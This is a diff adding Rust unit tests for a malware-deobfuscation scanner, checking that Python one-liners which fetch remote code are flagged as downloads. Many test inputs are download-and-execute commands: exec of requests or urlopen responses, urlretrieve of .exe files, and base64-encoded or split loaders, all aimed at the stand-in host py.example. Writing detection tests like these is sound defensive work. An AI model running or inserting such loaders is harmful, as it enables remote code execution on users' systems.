+            generic_count, 0,
+            "Python assigned requests module alias get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_parenthesized_get_import_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "python -c \"from requests import (\n    post,\n    get as fetch,\n); exec(fetch('https://py.example/requests-paren-import').text)\"",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-paren-import" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests parenthesized get import alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-paren-import")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests parenthesized import alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_post_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; requests.post('https://py.example/requests-post', data='x'); from requests import put as send; send('https://py.example/requests-put-alias'); s = requests.Session(); s.patch('https://py.example/session-patch')""#,
+            &mut env,
+        );
+        for expected in [
+            "https://py.example/requests-post",
+            "https://py.example/requests-put-alias",
+            "https://py.example/session-patch",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| {
+                    matches!(t,
+                        Trait::Download { src, dst, .. }
+                            if src == expected && dst.is_none()
+                    )
+                }),
+                "no structured Download from Python requests verb {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits.iter().any(|t| {
+                    matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)
+                }),
+                "Python requests verb URL double-emitted: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn python_requests_request_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.request('GET', 'https://py.example/requests-request').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-request" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.request GET: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-request")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.request GET URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_request_get_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; u = 'https://py.example/request-var'; exec(requests.request('GET', u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-var" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.request GET variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-var")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.request GET variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_request_get_variable_method_and_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; m = 'GET'; u = 'https://py.example/request-method-var'; exec(requests.request(m, u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-method-var" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.request variable method/URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-method-var")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.request variable method/URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_request_post_keyword_url_ignores_header_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.request(method='POST', headers={'Referer': 'https://py.example/request-post-referer'}, url='https://py.example/request-post-actual').text)""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-post-actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from Python requests.request POST keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://py.example/request-post-referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "Python requests.request POST header URL was promoted as structured source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_assigned_request_alias_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; req = requests.request; exec(req('GET', 'https://py.example/assigned-request').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-request" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests.request alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-request")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned requests.request alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_session_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.Session().get('https://py.example/session-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/session-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.Session().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/session-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.Session().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_session_request_get_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; s = requests.Session(); u = 'https://py.example/session-request-var'; exec(s.request('GET', u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/session-request-var" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests Session.request GET variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/session-request-var")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests Session.request GET variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_bound_session_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; s = requests.Session(); exec(s.get('https://py.example/bound-session-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/bound-session-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python bound requests.Session().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/bound-session-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python bound requests.Session().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_bound_session_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; s = requests.Session(); send = s.post; exec(send('https://py.example/bound-session-assigned-post').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/bound-session-assigned-post" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned bound Session.post alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/bound-session-assigned-post")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned bound Session.post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_module_alias_bound_session_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests as rq; s = rq.Session(); exec(s.get('https://py.example/alias-bound-session-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/alias-bound-session-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python aliased bound requests.Session().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-bound-session-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python aliased bound requests.Session().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_multiline_base64_import_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let payload = "import requests; requests.get('https://py.example/base64-paren-import')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(
+                "python -c \"from base64 import (\n    b64decode as dec,\n); exec(dec('{b64}'))\""
+            ),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/base64-paren-import" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python multiline base64 import alias: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlopen_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9546,6 +24607,869 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_urllib_urlopen_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from urllib.request import urlopen as fetch; exec(fetch('https://py.example/alias-loader').read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/alias-loader" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib urlopen alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-loader")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlopen alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_assigned_urlopen_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; fetch = urllib.request.urlopen; exec(fetch('https://py.example/assigned-urlopen').read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-urlopen" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned urllib urlopen alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-urlopen")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned urllib urlopen alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_request_from_import_assigned_urlopen_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from urllib import request as req; fetch = req.urlopen; exec(fetch('https://py.example/from-import-assigned-urlopen').read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/from-import-assigned-urlopen" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib request from-import assigned urlopen alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/from-import-assigned-urlopen")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urllib request from-import assigned urlopen alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_request_object_urlopen_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; r = urllib.request.Request('https://py.example/request-object'); exec(urllib.request.urlopen(r).read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-object" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib Request object urlopen: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-object")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urllib Request object URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_inline_request_object_keyword_url_ignores_header_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; exec(urllib.request.urlopen(urllib.request.Request(headers={'Referer': 'https://py.example/inline-request-referer'}, url='https://py.example/inline-request-actual')).read())""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/inline-request-actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from inline Python urllib Request object keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://py.example/inline-request-referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "inline Python urllib Request object header URL was promoted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; urllib.request.urlretrieve('https://py.example/file.exe', 'file.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/file.exe" && dst.as_deref() == Some("file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib urlretrieve: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from urllib.request import urlretrieve as grab; grab('https://py.example/alias-file.exe', 'alias.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/alias-file.exe"
+                        && dst.as_deref() == Some("alias.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/var-file.exe'; urllib.request.urlretrieve(u, 'var-file.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/var-file.exe"
+                        && dst.as_deref() == Some("var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_variable_destination_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/dst-var-file.exe'; f = 'dst-var-file.exe'; urllib.request.urlretrieve(u, f)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/dst-var-file.exe"
+                        && dst.as_deref() == Some("dst-var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download destination from Python urlretrieve variable destination: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/dst-var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve variable destination URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_literal_url_variable_destination_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; f = 'literal-dst-var-file.exe'; urllib.request.urlretrieve('https://py.example/literal-dst-var-file.exe', f)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/literal-dst-var-file.exe"
+                        && dst.as_deref() == Some("literal-dst-var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download destination from Python urlretrieve literal URL variable destination: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/literal-dst-var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve literal URL variable destination URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_reordered_keyword_args_emit_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/kw-file.exe'; f = 'kw-file.exe'; urllib.request.urlretrieve(filename=f, url=u)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/kw-file.exe"
+                        && dst.as_deref() == Some("kw-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve reordered keyword args: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/kw-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve reordered keyword args URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "python -c \"from urllib.request import (\n    urlopen,\n    urlretrieve as grab,\n); grab('https://py.example/multiline-alias-file.exe', 'multi.exe')\"",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/multiline-alias-file.exe"
+                        && dst.as_deref() == Some("multi.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python multiline urlretrieve alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/multiline-alias-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python multiline urlretrieve alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_request_module_alias_urlretrieve_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request as u; u.urlretrieve('https://py.example/module-alias-file.exe', 'module-alias.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/module-alias-file.exe"
+                        && dst.as_deref() == Some("module-alias.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib.request module alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/module-alias-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urllib.request module alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import urllib.request;exec(base64.b64decode(urllib.request.urlopen('https://py.example/inner').read().decode('utf-8')))";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(base64.b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_raw_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/raw-literal-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "exec(base64.b64decode(r'{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/raw-literal-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python raw-string b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_bound_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/bound-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "payload = '{b64}'; exec(base64.b64decode(payload))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/bound-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python bound b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_concat_bound_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/concat-bound-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let midpoint = b64.len() / 2;
+        let (left, right) = b64.split_at(midpoint);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(
+                r#"python.exe -c "payload = '{left}' + '{right}'; exec(base64.b64decode(payload))""#
+            ),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/concat-bound-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python concatenated bound b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_b64decode_adjacent_bound_literal_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/adjacent-bound-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let midpoint = b64.len() / 2;
+        let (left, right) = b64.split_at(midpoint);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(
+                r#"python.exe -c "payload = '{left}' '{right}'; exec(base64.b64decode(payload))""#
+            ),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/adjacent-bound-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from decoded Python adjacent bound b64 source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_imported_b64decode_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/imported-alias-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "from base64 import b64decode as d; exec(d('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/imported-alias-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from imported Python b64 alias source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_base64_star_import_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/star-import-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "from base64 import *; exec(b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/star-import-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python base64 star import source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/assigned-alias-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "d = base64.b64decode; exec(d('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/assigned-alias-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned b64 alias source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_dunder_import_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded =
+            "import requests;requests.get('https://py.example/dunder-assigned-alias-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
